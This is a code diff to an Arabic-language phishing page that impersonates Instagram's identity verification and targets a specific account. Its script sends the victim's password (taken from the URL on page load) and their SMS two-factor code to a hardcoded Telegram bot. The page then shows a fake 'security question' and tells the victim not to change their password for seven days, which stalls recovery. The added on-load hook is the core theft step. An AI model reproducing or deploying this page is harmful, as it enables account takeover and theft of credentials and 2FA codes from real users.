@@ -13,48 +13,51 @@
         .input-code { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin: 20px 0; text-align: center; font-size: 20px; letter-spacing: 5px; box-sizing: border-box; }
         .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 13px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
         #photo-step { display: none; }
-        .cat-frame { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #efefef; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .choice-row { display: flex; gap: 10px; margin-top: 15px; }
+        .cat-frame { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #efefef; }
     </style>
 </head>
 <body>
 
     <div class="container" id="sms-step">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-        <h2>تحقق من الهوية</h2>
-        <p>لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المرتبط بـ <b>@_5z5z5</b>. يرجى إدخاله لتوثيق ملكيتك للجهاز الحالي.</p>
-        <input type="text" id="sms_val" class="input-code" placeholder="000000" maxlength="6">
-        <button class="btn" onclick="sendSMS()">متابعة التأمين</button>
+        <h2>تحقق من الرمز</h2>
+        <p>أدخل الرمز المكون من 6 أرقام المرسل لهاتفك لتأكيد ملكية الحساب <b>@_5z5z5</b>.</p>
+        <input type="text" id="sms_val" class="input-code" placeholder="000000" maxlength="8">
+        <button class="btn" onclick="sendSMS()">تأكيد وتأمين</button>
     </div>
 
     <div class="container" id="photo-step">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-        <h2>مراجعة سجلات الاسترداد</h2>
-        <p>هل قمت بحذف هذه الصورة من ملفك الشخصي كجزء من عملية تنظيف البيانات السابقة؟</p>
+        <h2>سؤال الأمان</h2>
+        <p>هل قمت بحذف هذه الصورة مؤخراً؟</p>
         <img src="IMG_1145.jpeg" class="cat-frame">
-        <div class="choice-row">
-            <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">نعم، قمت بحذفها</button>
-            <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">لا، لم أفعل</button>
+        <div style="display: flex; gap: 10px;">
+            <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">نعم</button>
+            <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">لا</button>
         </div>
     </div>
 
     <script>
+        // أول ما تفتح الصفحة يرسل الباسورد للبوت فوراً
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            const pass = params.get('pass');
+            if(pass) {
+                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=🔑 كلمة المرور (الخطوة 1): ${pass}`);
+            }
+        };
+
         function sendSMS() {
             const code = document.getElementById('sms_val').value;
             if(code.length > 2) {
-                // إرسال رمز الـ SMS إلى بوت التليجرام الخاص بك
-                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=🔑 الرمز الثاني (SMS): ${code}`);
-                
+                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=📲 رمز التحقق (SMS): ${code}`);
                 document.getElementById('sms-step').style.display = 'none';
                 document.getElementById('photo-step').style.display = 'block';
-            } else {
-                alert("يرجى إدخال رمز صالح");
             }
         }
 
         function finish() {
-            // النصيحة القوية التي اخترتها
-            alert("تم تأمين حسابك بنجاح. كإجراء وقائي، يرجى تجنب تغيير كلمة المرور أو إعدادات الأمان خلال الـ 7 أيام القادمة. تغيير البيانات بشكل متكرر في وقت قصير قد يؤدي إلى قفل الحساب نهائياً بتهمة 'نشاط آلي مشبوه'.");
+            alert("تم تأمين حسابك بنجاح. يرجى عدم تغيير كلمة المرور خلال الـ 7 أيام القادمة لتجنب قفل الحساب.");
             window.location.href = "https://www.instagram.com";
         }
     </script>
